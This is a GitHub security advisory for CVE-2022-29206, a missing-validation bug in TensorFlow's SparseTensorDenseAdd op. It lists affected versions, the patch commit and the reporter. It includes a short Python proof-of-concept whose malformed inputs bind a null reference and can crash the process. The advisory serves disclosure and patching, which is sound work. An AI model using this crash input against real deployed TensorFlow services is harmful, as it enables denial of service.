# [M] Missing validation results in undefined behavior in `SparseTensorDenseAdd

## Summary
Severity: Medium
Advisory: GHSA-rc9w-5c64-9vqq
CVE: CVE-2022-29206
CWE: CWE-20, CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-05-24
Source: https://github.com/advisories/GHSA-rc9w-5c64-9vqq
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.6.4
- PyPI: `tensorflow` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.6.4
- PyPI: `tensorflow-cpu` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.6.4
- PyPI: `tensorflow-gpu` — affected >=2.7.0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1

## Details
### Impact
The implementation of [`tf.raw_ops.SparseTensorDenseAdd`](https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse_tensor_dense_add_op.cc) does not fully validate the input arguments:

```python
import tensorflow as tf

a_indices = tf.constant(0, shape=[17, 2], dtype=tf.int64)
a_values = tf.constant([], shape=[0], dtype=tf.float32)
a_shape = tf.constant([6, 12], shape=[2], dtype=tf.int64)

b = tf.constant(-0.223668531, shape=[6, 12], dtype=tf.float32)

tf.raw_ops.SparseTensorDenseAdd(
    a_indices=a_indices, a_values=a_values, a_shape=a_shape, b=b)
```

In this case, a reference gets bound to a `nullptr` during kernel execution. This is UB.

### Patches
We have patched the issue in GitHub commit [11ced8467eccad9c7cb94867708be8fa5c66c730](https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730).

The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rc9w-5c64-9vqq
- https://nvd.nist.gov/vuln/detail/CVE-2022-29206
- https://github.com/tensorflow/tensorflow/commit/11ced8467eccad9c7cb94867708be8fa5c66c730
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/blob/f3b9bf4c3c0597563b289c0512e98d4ce81f886e/tensorflow/core/kernels/sparse_tensor_dense_add_op.cc
- https://github.com/tensorflow/tensorflow/releases/tag/v2.6.4
- https://github.com/tensorflow/tensorflow/releases/tag/v2.7.2
- https://github.com/tensorflow/tensorflow/releases/tag/v2.8.1
- https://github.com/tensorflow/tensorflow/releases/tag/v2.9.0
